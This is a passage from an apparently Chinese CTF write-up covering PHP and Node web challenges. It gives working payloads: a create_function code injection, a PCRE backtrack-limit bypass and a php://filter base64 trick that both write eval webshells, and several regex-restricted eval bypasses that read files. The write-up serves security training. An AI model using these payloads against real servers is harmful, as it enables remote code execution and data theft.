local_retval;</span><br><span class="line"></span><br><span class="line">EG(no_extensions)=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">new_op_array-&gt;scope = zend_get_executed_scope();</span><br><span class="line"></span><br><span class="line">zend_try &#123;</span><br><span class="line">ZVAL_UNDEF(&amp;local_retval);</span><br><span class="line">            <span class="comment">// 执行 opcode，把结果存储到 local_retval</span></span><br><span class="line">zend_execute(new_op_array, &amp;local_retval);</span><br><span class="line">&#125; zend_catch &#123;</span><br><span class="line">destroy_op_array(new_op_array);</span><br><span class="line">efree_size(new_op_array, <span class="keyword">sizeof</span>(zend_op_array));</span><br><span class="line">zend_bailout();</span><br><span class="line">&#125; zend_end_try();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Z_TYPE(local_retval) != IS_UNDEF) &#123;</span><br><span class="line"><span class="keyword">if</span> (retval_ptr) &#123;</span><br><span class="line">ZVAL_COPY_VALUE(retval_ptr, &amp;local_retval);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">zval_ptr_dtor(&amp;local_retval);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (retval_ptr) &#123;</span><br><span class="line">ZVAL_NULL(retval_ptr);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">EG(no_extensions)=<span class="number">0</span>;</span><br><span class="line">destroy_op_array(new_op_array);</span><br><span class="line">efree_size(new_op_array, <span class="keyword">sizeof</span>(zend_op_array));</span><br><span class="line">retval = SUCCESS;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">retval = FAILURE;</span><br><span class="line">&#125;</span><br><span class="line">zval_dtor(&amp;pv);</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>全局空间</strong></p><blockquote><p>(PHP 5 &gt;= 5.3.0, PHP 7)</p><p>如果没有定义任何命名空间，所有的类与函数的定义都是在全局空间，与 PHP 引入命名空间概念前一样。在名称前加上前缀 <code>\</code> 表示该名称是全局空间中的名称，即使该名称位于其它的命名空间中时也是如此。</p></blockquote><p>Example</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">A</span>\<span class="title">B</span>\<span class="title">C</span>;</span><br><span class="line"><span class="comment">/* 这个函数是 A\B\C\fopen */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fopen</span><span class="params">()</span> </span>&#123;      </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    $f = \fopen(...); <span class="comment">// 调用全局的fopen函数     </span></span><br><span class="line">    <span class="keyword">return</span> $f;&#125; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ccc</span>;</span><br><span class="line">\<span class="keyword">eval</span>($_REQUEST[<span class="string">'a'</span>]);</span><br></pre></td></tr></table></figure><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>利用 <code>$action(&#39;&#39;, $arg)</code> 构造远程代码执行，这里使用 <code>create_function()</code></p><h4 id="阻碍"><a href="#阻碍" class="headerlink" title="阻碍"></a>阻碍</h4><p><code>$action</code> 中不能全是字母、数字以及下划线，无法直接调用 <code>create_function()</code></p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>为了不影响 <code>create_function</code> 调用，只能在前面或者后面插入一个无法被正则匹配到的字符。直接 fuzz 一波 ASCII 码，从 <code>%00 ~ %ff</code> 可得到 %5c 即 <code>\</code>。</p><p>先试一下 <code>phpinfo</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">5</span>ccreate_function&amp;arg=&#125;phpinfo();<span class="comment">//</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\wywwzjj\Documents\oCam\屏幕捕获_2019_03_03_20_11_09_363.png" alt="屏幕捕获_2019_03_03_20_11_09_363"></p><p><strong>然后找 <code>flag</code></strong></p><p>看一下 <strong>disable_functions</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,</span><br><span class="line">mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</span><br></pre></td></tr></table></figure><p>那直接用 php 的文件操作函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?action=\create_function&amp;arg=&#125;print_r(scandir(dirname(<span class="keyword">__FILE__</span>).<span class="string">"/../"</span>));<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">var_dump(glob(<span class="string">"/var/www/*"</span>));  <span class="comment">// 也可以</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\wywwzjj\Documents\oCam\屏幕捕获_2019_03_03_20_24_07_84.png" alt="屏幕捕获_2019_03_03_20_24_07_84"></p><p>查看 flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;arg=&#125;print_r(file_get_contents(<span class="string">'../flag_h0w2execute_arb1trary_c0de'</span>));<span class="comment">//</span></span><br></pre></td></tr></table></figure></p><p><img src="C:\Users\wywwzjj\Documents\oCam\屏幕捕获_2019_03_03_20_26_02_799.png" alt="屏幕捕获_2019_03_03_20_26_02_799"></p><h2 id="2-easy-pcrewaf"><a href="#2-easy-pcrewaf" class="headerlink" title="2.easy - pcrewaf"></a>2.easy - pcrewaf</h2><blockquote><p>PHP 正则特性</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h4><p>写入一句话后门。</p><h4 id="阻碍-1"><a href="#阻碍-1" class="headerlink" title="阻碍"></a>阻碍</h4><p>正则匹配式waf，不能写入 <code>&lt;?</code> 等必要的符号。<code>&lt;script language=&quot;php&quot;&gt;</code> 在低版本里或许可以试试，然而 PHP7 已经不支持这个标签了。</p><h4 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h4><p>这有一类似的题 <a href="https://github.com/LCTF/LCTF2017/tree/master/src/web/%E8%90%8C%E8%90%8C%E5%93%92%E7%9A%84%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">萌萌哒的报名系统</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/^(xdsec)((?:###|\w)+)$/i'</span>, $code, $matches);</span><br></pre></td></tr></table></figure><blockquote><p>其实正解是通过pre_match函数的资源消耗来绕过，因为pre_match在匹配的时候会消耗较大的资源，并且默认存在贪婪匹配，所以通过喂一个超长的字符串去给pre_match吃，导致pre_match消耗大量资源从而导致php超时，后面的php语句就不会执行。</p></blockquote><p>ph 师傅也单独写了一篇文章讲这个问题 <a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><p><strong>回溯超过一百万次，返回 false</strong>  <a href="https://regex101.com/r/1ecWok/1/debugger" target="_blank" rel="noopener">具体回溯过程</a></p><p><img src="https://ws1.sinaimg.cn/large/de75fd55gy1g32e23q6nuj20p2019wek.jpg" alt></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="number">1</span>]);<span class="comment">// a*1000000</span></span><br></pre></td></tr></table></figure><h2 id="3-easy-phpmagic"><a href="#3-easy-phpmagic" class="headerlink" title="3.easy - phpmagic"></a>3.easy - phpmagic</h2><blockquote><p>PHP 写文件技巧</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chdir(DATA_DIR);  <span class="comment">// 改变当前目录为 DATA_DIR</span></span><br><span class="line"></span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">    $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">    $output = shell_exec($command);</span><br><span class="line">    $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line"></span><br><span class="line">    $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">    <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), </span><br><span class="line">      [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">        file_put_contents($log_name, $output);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line"><span class="keyword">endif</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="解决方法-2"><a href="#解决方法-2" class="headerlink" title="解决方法"></a>解决方法</h4><p>注意到有个 <code>escapeshellarg($domain)</code>，功能如下： </p><p>1.确保用户只传递一个参数给命令<br>2.用户不能指定更多的参数一个<br>3.用户不能执行不同的命令</p><p><code>htmlspecialchars()</code></p><ul><li>ENT_HTML401 - 默认。作为 HTML 4.01 处理代码。</li><li>ENT_QUOTES - 编码双引号和单引号。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; <span class="function">(<span class="params">AND</span>) =&gt;</span> &amp;</span><br><span class="line"><span class="string">" (双引号) =&gt; "</span> (当ENT_NOQUOTES没有设置的时候) </span><br><span class="line"><span class="string">' (单引号) =&gt; '</span> (当ENT_QUOTES设置) </span><br><span class="line">&lt; <span class="function">(<span class="params">小于号</span>) =&gt;</span> &lt; </span><br><span class="line">&gt; <span class="function">(<span class="params">大于号</span>) =&gt;</span> &gt;</span><br></pre></td></tr></table></figure><p>对于前头这些字符串</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; &amp;<span class="keyword">lt</span>;&amp;<span class="keyword">lt</span>;&amp;<span class="keyword">gt</span>;&amp;<span class="keyword">gt</span>; DiG <span class="number">9.9</span>.<span class="number">5</span>-<span class="number">9</span>+deb8u15-Debian &amp;<span class="keyword">lt</span>;&amp;<span class="keyword">lt</span>;&amp;<span class="keyword">gt</span>;&amp;<span class="keyword">gt</span>; -t A -q</span><br></pre></td></tr></table></figure><p>符合base64规范的字符是：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ltltgtgtDi<span class="name">G9959</span>deb<span class="number">8</span>u<span class="number">15</span>Debia<span class="symbol">nltltgtgttAq</span></span><br></pre></td></tr></table></figure><p>恰好是40位，为4的倍数，就不用管这个，只需要添加我们的字符串。因为插入的字符在中间，所以不能有 <code>=</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: php</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">domain=PD9waHAgZXZhbCgkX0dFVFsnYyddKTs/Pg&amp;log=:<span class="comment">//filter/write=convert.base64-decode/resource=shell.php/.</span></span><br></pre></td></tr></table></figure><p>成功写入一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'c'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-easy-phplimit"><a href="#4-easy-phplimit" class="headerlink" title="4.easy - phplimit"></a>4.easy - phplimit</h2><blockquote><p>PHP 代码执行限制绕过</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;   </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与 2018 RCTF r-cursive 差不多</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">';'</span> === preg_replace(<span class="string">'/[^\W_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'cmd'</span>]) ? <span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]) : show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><h4 id="预备知识-1"><a href="#预备知识-1" class="headerlink" title="预备知识"></a>预备知识</h4><p>好好的一句话被限制了，但我们不就着迷于这种斗智斗勇~</p><h4 id="目标-2"><a href="#目标-2" class="headerlink" title="目标"></a>目标</h4><p>执行任意命令，恢复一句话的活力。</p><h4 id="阻碍-2"><a href="#阻碍-2" class="headerlink" title="阻碍"></a>阻碍</h4><p>受正则限制，只能执行如下形式的代码。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a()<span class="comment">;</span></span><br><span class="line">b(c())<span class="comment">;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/de75fd55gy1g32ef9q0u3j20be041t8s.jpg" alt></p><h4 id="解决方法-3"><a href="#解决方法-3" class="headerlink" title="解决方法"></a>解决方法</h4><ul><li><code>getenv</code></li><li><code>getallheaders</code> Nginx</li></ul><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=end(<span class="name">getallheaders</span>())<span class="comment">;</span></span><br></pre></td></tr></table></figure><ul><li><code>get_defined_vars</code> Apache</li><li><code>session_id</code></li></ul><blockquote><p>session_id ([ string <code>$id</code> ] ) : string</p><p><strong>session_id()</strong> is used to get or set the session id for the current session.</p></blockquote><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=eval(<span class="name">hex2bin</span>(<span class="name">session_id</span>(<span class="name">session_start</span>())))</span><br></pre></td></tr></table></figure><ul><li><code>dirname</code> &amp; <code>chdir</code></li></ul><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=readfile(<span class="name">next</span>(<span class="name">array_reverse</span>(<span class="name">scandir</span>(<span class="name">dirname</span>(<span class="name">chdir</span>(<span class="name">dirname</span>(<span class="name">getcwd</span>())))))))<span class="comment">;</span></span><br></pre></td></tr></table></figure><h2 id="5-easy-nodechr"><a href="#5-easy-nodechr" class="headerlink" title="5.easy - nodechr"></a>5.easy - nodechr</h2><blockquote><p>JavaScript 字符串特性</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// initial libraries</span></span><br><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>)</span><br><span class="line"><span class="keyword">const</span> sqlite = <span class="built_in">require</span>(<span class="string">'sqlite'</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> views = <span class="built_in">require</span>(<span class="string">'koa-views'</span>)</span><br><span class="line"><span class="keyword">const</span> Router = <span class="built_in">require</span>(<span class="string">'koa-router'</span>)</span><br><span class="line"><span class="keyword">const</span> send = <span class="built_in">require</span>(<span class="string">'koa-send'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'koa-bodyparser'</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'koa-session'</span>)</span><br><span class="line"><span class="keyword">const</span> isString = <span class="built_in">require</span>(<span class="string">'underscore'</span>).isString</span><br><span class="line"><span class="keyword">const</span> basename = <span class="built_in">require</span>(<span class="string">'path'</span>).basename</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">JSON</span>.parse(fs.readFileSync(<span class="string">'../config.json'</span>, &#123;<span class="attr">encoding</span>: <span class="string">'utf-8'</span>, <span class="attr">flag</span>: <span class="string">'r'</span>&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> app = <span class="keyword">new</span> Koa()</span><br><span class="line">    <span class="keyword">const</span> router = <span class="keyword">new</span> Router()</span><br><span class="line">    <span class="keyword">const</span> db = <span class="keyword">await</span> sqlite.open(<span class="string">':memory:'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE "main"."users" (</span></span><br><span class="line"><span class="string">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">        "username" TEXT NOT NULL,</span></span><br><span class="line"><span class="string">        "password" TEXT,</span></span><br><span class="line"><span class="string">        CONSTRAINT "unique_username" UNIQUE ("username")</span></span><br><span class="line"><span class="string">    )`</span>)</span><br><span class="line">    <span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE "main"."flags" (</span></span><br><span class="line"><span class="string">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">        "flag" TEXT NOT NULL</span></span><br><span class="line"><span class="string">    )`</span>)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> user <span class="keyword">of</span> config.users) &#123;</span><br><span class="line">        <span class="keyword">await</span> db.run(<span class="string">`INSERT INTO "users"("username", "password") VALUES ('<span class="subst">$&#123;user.username&#125;</span>', '<span class="subst">$&#123;user.password&#125;</span>')`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> db.run(<span class="string">`INSERT INTO "flags"("flag") VALUES ('<span class="subst">$&#123;config.flag&#125;</span>')`</span>)</span><br><span class="line"></span><br><span class="line">    router.all(<span class="string">'login'</span>, <span class="string">'/login/'</span>, login).get(<span class="string">'admin'</span>, <span class="string">'/'</span>, admin).get(<span class="string">'static'</span>, <span class="string">'/static/:path(.+)'</span>, <span class="keyword">static</span>).get(<span class="string">'/source'</span>, source)</span><br><span class="line"></span><br><span class="line">    app.use(views(__dirname + <span class="string">'/views'</span>, &#123;</span><br><span class="line">        map: &#123;</span><br><span class="line">            html: <span class="string">'underscore'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        extension: <span class="string">'html'</span></span><br><span class="line">    &#125;)).use(bodyParser()).use(session(app))</span><br><span class="line">    </span><br><span class="line">    app.use(router.routes()).use(router.allowedMethods());</span><br><span class="line">    </span><br><span class="line">    app.keys = config.signed</span><br><span class="line">    app.context.db = db</span><br><span class="line">    app.context.router = router</span><br><span class="line">    app.listen(<span class="number">3000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ctx.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line">        <span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">            <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM "users" WHERE "username" = '<span class="subst">$&#123;username.toUpperCase()&#125;</span>' AND "password" = '<span class="subst">$&#123;password.toUpperCase()&#125;</span>'`</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> ctx.render(<span class="string">'index'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">static</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, ctx.path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">admin</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!ctx.session.user) &#123;</span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        <span class="keyword">return</span> ctx.redirect(ctx.router.url(<span class="string">'login'</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> ctx.render(<span class="string">'admin'</span>, &#123;</span><br><span class="line">        <span class="string">'user'</span>: ctx.session.user</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, 